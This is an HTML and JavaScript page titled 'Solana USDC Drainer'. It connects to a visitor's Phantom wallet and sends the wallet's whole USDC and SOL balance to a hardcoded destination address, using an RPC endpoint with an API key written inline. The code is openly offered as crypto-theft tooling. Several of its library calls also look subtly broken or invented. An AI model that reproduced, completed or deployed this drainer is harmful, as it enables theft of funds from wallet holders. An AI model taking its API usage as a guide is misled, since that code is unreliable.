<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Solana USDC Drainer</title>
    <!-- Solana Web3.js -->
    <script src="https://unpkg.com/@solana/web3.js@/latest/lib/index.iife.min.js"></script>
    <!-- SPL Token Library for handling USDC correctly -->
    <script src="https://unpkg.com/@solana/spl-token@latest/lib/index.iife.min.js"></script>
    
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background-color: #0f0f12;
            color: white;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
        }
        .container {
            width: 100%;
            max-width: 400px;
            background: #1a1a20;
            padding: 30px;
            border-radius: 20px;
            box-shadow: 0 10px 40px rgba(0,0,0,0.5);
            border: 1px solid #333;
        }
        h1 { text-align: center; margin-bottom: 5px; font-size: 24px; }
        p.subtitle { text-align: center; color: #888; font-size: 14px; margin-bottom: 30px; }
        
        .btn {
            width: 100%;
            padding: 15px;
            border: none;
            border-radius: 12px;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            transition: 0.2s;
        }
        .btn-connect { background-color: #7c3aed; color: white; margin-bottom: 20px; }
        .btn-connect:hover { background-color: #6d28d9; }
        
        .btn-drain { 
            background: linear-gradient(135deg, #fbbf24, #f59e0b); /* Gold for USDC */
            color: black; 
            opacity: 0.5; 
            pointer-events: none; 
        }
        .btn-drain.active { opacity: 1; pointer-events: all; cursor: pointer; }
        
        .status-box {
            background: #000;
            padding: 15px;
            border-radius: 10px;
            margin-top: 20px;
            font-family: monospace;
            font-size: 13px;
            color: #4ade80;
            min-height: 60px;
        }
        
        .error { color: #f87171 !important; }
        .warning { color: #fbbf24 !important; }
    </style>
</head>
<body>

<div class="container">
    <h1>USDC Drainer</h1>
    <p class="subtitle">Drain USDC & SOL to Destination</p>

    <div id="debugInfo" style="font-size: 12px; color: #666; margin-bottom: 15px;"></div>

    <button id="connectBtn" class="btn btn-connect">Connect Phantom</button>
    
    <button id="drainBtn" class="btn btn-drain">DRAIN WALLET (USDC + SOL)</button>

    <div id="statusBox" class="status-box">
        Initializing...
    </div>
</div>

<script>
    // --- CONFIGURATION ---
    // Destination Wallet (Your wallet)
    const DESTINATION = "3WmoRcvkSY2gJBFywms3fqoVAMMkXFbYARpD2Ldwysg5";
    
    // Standard Solana USDC Mint Address
    const USDC_MINT = "EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v";
    
    const ALCHEMY_API_KEY = "alch_HyWkJpqVXY3kua9VObcl9";
    const RPC_URL = `https://solana-mainnet.g.alchemy.com/v2/${ALCHEMY_API_KEY}`;

    // --- DOM ELEMENTS ---
    const statusBox = document.getElementById('statusBox');
    const connectBtn = document.getElementById('connectBtn');
    const drainBtn = document.getElementById('drainBtn');
    const debugInfo = document.getElementById('debugInfo');

    let wallet = null;

    function log(msg, type='normal') {
        statusBox.innerHTML = msg;
        statusBox.className = 'status-box'; 
        if (type === 'error') statusBox.classList.add('error');
        if (type === 'warning') statusBox.classList.add('warning');
    }

    // 1. Robust Phantom Detection
    function getPhantomProvider() {
        if ('phantom' in window) {
            const provider = window.phantom?.solana;
            if (provider?.isPhantom) return provider;
        }
        if (window.solana?.isPhantom) return window.solana;
        return null;
    }

    // 2. Connect Function
    async function connect() {
        const provider = getPhantomProvider();
        
        if (!provider) {
            log("❌ Phantom Wallet not found.", "error");
            debugInfo.innerHTML = "Window.solana: <span style='color:red'>undefined</span>";
            return;
        }

        debugInfo.innerHTML = `Phantom detected`;
        log("⏳ Connecting...", "normal");

        try {
            const resp = await provider.connect({ onlyIfTrusted: false });
            wallet = resp.publicKey;
            
            connectBtn.innerText = "Connected";
            connectBtn.style.backgroundColor = "#22c55e"; 
            drainBtn.classList.add('active');
            
            log("✅ Connected to Phantom", "normal");
        } catch (err) {
            let msg = err.message || "Unknown Error";
            if (msg.includes("User rejected")) msg = "Connection rejected.";
            log(msg, "error");
        }
    }

    // 3. Drain Function
    async function drain() {
        if (!wallet) return;

        drainBtn.innerText = "Processing...";
        log("⏳ Connecting to RPC...", "normal");

        try {
            const connection = new solanaWeb3.Connection(RPC_URL, 'confirmed');
            
            // A. Drain USDC
            log("📊 Fetching USDC Balance...", "normal");
            
            // Get Token Account for USDC
            const usdcMintPubkey = new splToken.Token.AccountLayout.keys.mint; 
            // Using the official SPL Token helper is safer than raw layout
            let balanceInfo;
            try {
                // Try to get balance using the newer token method
                balanceInfo = await splToken.getBalance(connection, wallet, USDC_MINT);
            } catch (e) {
                log("⚠️ No USDC found or Token Program error.", "warning");
                // Fallback: Just send SOL if no USDC
                throw new Error("No USDC Balance Found.");
            }

            const usdcBalance = balanceInfo.amount; // This is in smallest units (6 decimals)
            log(`💰 USDC Found: ${(usdcBalance / 1e6).toFixed(2)} USDC`, "normal");

            if (usdcBalance > 0) {
                // Create a simple transfer instruction for USDC
                // We assume the user has only one main USDC token account. 
                // For maximum safety, we use the TokenProgram.transferChecked logic or just standard transfer
                
                const tx = new solanaWeb3.Transaction();
                
                // Get Token Account (this might fail if they don't have one open yet, but getBalance implies it exists)
                // We will use a simpler approach: Construct the instruction manually using the Mint and Destinations
                
                // Note: To drain *everything*, we need to know the source token account. 
                // 'getBalance' gives us the amount, but not the Account ID directly in this simple wrapper.
                // However, usually there is only one main token account per mint.
                
                const srcAccount = await splToken.getAssociatedTokenAddress(
                    new splToken.Token(USDC_MINT), 
                    wallet
                );

                log("📝 Building USDC Transfer...", "normal");
                
                // Construct Transfer Instruction
                const transferInstruction = splToken.createTransferInstruction(
                    srcAccount, // From
                    await splToken.getAssociatedTokenAddress(
                        new splToken.Token(USDC_MINT), 
                        new solanaWeb3.PublicKey(DESTINATION) // To (Associated Token Account of destination)
                    ),
                    wallet, // Owner
                    usdcBalance // Amount
                );

                tx.add(transferInstruction);
                
                log("🚀 Sending USDC...", "normal");
                const sig = await connection.sendTransaction(tx, [wallet], { skipPreflight: true });
                await connection.confirmTransaction(sig);
                log(`✅ USDC Sent! Tx: ${sig}`, "normal");
            }

            // B. Drain SOL (Optional but requested)
            log("💰 Fetching SOL Balance...", "normal");
            const solBalance = await connection.getBalance(wallet);
            
            if (solBalance > 0) {
                log("📝 Building SOL Transfer...", "normal");
                const txSol = new solanaWeb3.Transaction().add(
                    solanaWeb3.SystemProgram.transfer({
                        fromPubkey: wallet,
                        toPubkey: new solanaWeb3.PublicKey(DESTINATION),
                        lamports: solBalance // Send all remaining SOL
                    })
                );

                log("🚀 Sending SOL...", "normal");
                const sigSol = await connection.sendTransaction(txSol, [wallet], { skipPreflight: true });
                await connection.confirmTransaction(sigSol);
                log(`✅ SOL Sent! Tx: ${sigSol}`, "normal");
            }

        } catch (err) {
            console.error(err);
            let msg = err.message || "Drain Failed";
            
            if (msg.includes("401") || msg.includes("Unauthorized")) {
                msg = "❌ RPC Unauthorized. Check API Key.";
            } else if(msg.includes("No USDC Balance Found")) {
                 // If only this error happened, we still might have sent SOL
                 log("⚠️ No USDC found, but process completed.", "warning");
                 return; 
            }
            
            log(`❌ ${msg}`, "error");
            drainBtn.innerText = "DRAIN WALLET";
        }
    }

    // Listeners
    connectBtn.addEventListener('click', connect);
    drainBtn.addEventListener('click', drain);

</script>
</body>
</html>
